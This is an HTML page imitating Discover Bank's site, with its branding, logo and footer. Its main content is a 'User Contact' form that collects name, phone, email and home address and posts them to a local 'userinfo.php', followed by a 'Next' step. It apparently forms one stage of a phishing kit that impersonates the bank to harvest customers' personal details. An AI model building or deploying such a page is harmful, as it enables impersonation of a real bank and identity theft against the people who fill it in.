<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Credit Cards, Banking & Loans - Discover</title>
    <link rel="stylesheet" href="./styles/index.css" />
    <link rel="shortcut icon" href="./favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./styles//userinfo.css" />
  </head>

  <body>
    <main>
      <header class="header">
        <div>
          <img
            src="./assets/discover-logo.svg"
            alt=""
            height="100"
            width="100"
          />
        </div>
        <div class="header-nav-bar">
          <select name="" id="">
            <option value="">All Products</option>
            <option value=""></option>
            <option value=""></option>
            <option value=""></option>
          </select>
          <small> Help and Resources</small>
          <small style="display: flex; align-items: center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="#000"
              height="1em"
              viewBox="0 0 512 512"
              style="margin-right: 5px"
            >
              <!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. -->
              <path
                d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"
              />
            </svg>
            search
          </small>
          <!-- <label for="id">Log In </label> -->
        </div>
      </header>
      <div class="money-work">
        <h1 style="padding: 5px 30px;">
          User Contact
        </h1>
      </div>
      <div class="user-info-form">
        <form action="./userinfo.php" method="post">
          <!-- name group -->
          <div class="name-group">
            <div>
              <label for="">
                Name <span style="color: rgb(130, 6, 6)">*</span>
                </label>
              <input
                class="input-border"
                required
                placeholder="first"
                type="text"
                name="first-name"
              />
            </div>
            <div>
              <label for=""></label>
              <br />
              <input class="input-border" required placeholder="last" type="text" name="last-name" />
            </div>
            <div>
              <label for=""></label>
              <br />
              <input class="input-border" placeholder="middle" type="text" name="middle-name" />
            </div>
          </div>
          <!-- contact group -->
          <div class="contact-group">
            <div class="phone">
              <label for="">
                Phone<span style="color: rgb(130, 6, 6)">*</span>
              </label>
              <input
                class="input-border"
                placeholder="phone"
                required
                class="phone"
                type="text"
                name="phone"
                id=""
              />
            </div>
            <div class="email">
              <label for="">
                Email<span style="color: rgb(130, 6, 6)">*</span>
              </label>
              <input
                class="input-border"
                placeholder="email"
                required
                class="email"
                type="email"
                name="email"
                id=""
              />
            </div>
          </div>
          <!-- address group -->
          <div class="address-group">
            <div>
              <label for="">
                Current Address<span style="color: rgb(130, 6, 6)">*</span>
              </label>
              <input
                required
                class="address input-border"
                type="text"
                name="address1"
                id=""
                placeholder="address line 1"
              />
            </div>
            <div>
              <input
                placeholder="address line 2"
                class="address input-border"
                type="text"
                name="address2"
                id=""
              />
            </div>
            <div class="city-info">
              <input class="input-border" type="text" name="city" placeholder="city" />
              <input class="input-border" type="text" name="state" placeholder="state" />
              <input class="input-border" type="number" name="zipcode" placeholder="zipcode" />
            </div>
          </div>
          <div class="submit-btn-cont">
            <button class="submit-btn" type="submit">Next &nbsp; <svg xmlns="http://www.w3.org/2000/svg" fill="#fff" height="1em" viewBox="0 0 384 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M3.4 81.7c-7.9 15.8-1.5 35 14.3 42.9L280.5 256 17.7 387.4C1.9 395.3-4.5 414.5 3.4 430.3s27.1 22.2 42.9 14.3l320-160c10.8-5.4 17.7-16.5 17.7-28.6s-6.8-23.2-17.7-28.6l-320-160c-15.8-7.9-35-1.5-42.9 14.3z"/></svg> </button>
          </div>
        </form>
      </div>
      <h4 class="action-footer">
        The Contactless Symbol is a trademark owned by and used with permission
        of EMVCo, LLC
      </h4>
      <div class="footer-actions">
        <h4>Products & Services</h4>
        <h4>About Our Company</h4>
        <h4>Resources & Legal</h4>
        <h4>Quick Links</h4>
        <!-- first line -->
        <p>Credit Cards</p>
        <p>About Discover</p>
        <p>Card Smarts</p>
        <p>Mobile App</p>
        <!-- second line -->
        <p>Online Banking</p>
        <p>Contact Us</p>
        <p>Modern Money</p>
        <p>Refer a Friend</p>
        <!-- third line -->
        <p>Personal Loans</p>
        <p>ESG</p>
        <p>Personal Loan Resources</p>
        <p>ATM Locator</p>
        <!-- fouth line -->
        <p>Student Loans</p>
        <p>Investor Relations</p>
        <p>Home Loan Resources</p>
        <p>Sitemap</p>
        <!-- fifth line -->
        <p>Student Loans</p>
        <p>Investor Relations</p>
        <p>Home Loan Resources</p>
        <p>Sitemap</p>
        <!-- sixth line -->
        <p>Home Equity Loans</p>
        <p>Newsroom</p>
        <p>College Planning</p>
        <p>Language Services</p>
        <!-- seventh line -->
        <p>Mortgage Refinance</p>
        <p>Accept Discover</p>
        <p>Privacy</p>
        <p>Accesibility</p>
        <!-- eighth line -->
        <p>Diners Club International</p>
        <p>Diversity & Inclusion</p>
        <p>Security</p>
        <p>Browser Support</p>
        <!-- ninth line -->
        <p>PULSE</p>
        <p>Discover Technology</p>
        <p>Terms of Use</p>
        <p>AdChoices</p>
        <!-- ninth line -->
        <p></p>
        <p></p>
        <p>Cardmember Agreement</p>
        <p>Careers</p>
      </div>
      <footer class="main-footer">
        <img src="./assets/Facebook.webp" alt="" />
        <img src="./assets/Twitter.webp" alt="" />
        <img src="./assets/Instagram.webp" alt="" />
        <img src="./assets/linkedin.webp" alt="" />
        <samll> ©2023 Discover Bank, Member FDIC</samll>
        <img src="./assets/footer-icon-house.webp" alt="" />
        <img src="./assets/footer-icon-accredit.webp" alt="" />
        <img src="./assets/footer-icon-member.webp" alt="" />
      </footer>
    </main>
    <script src="./userinfo.js"></script>
  </body>
</html>
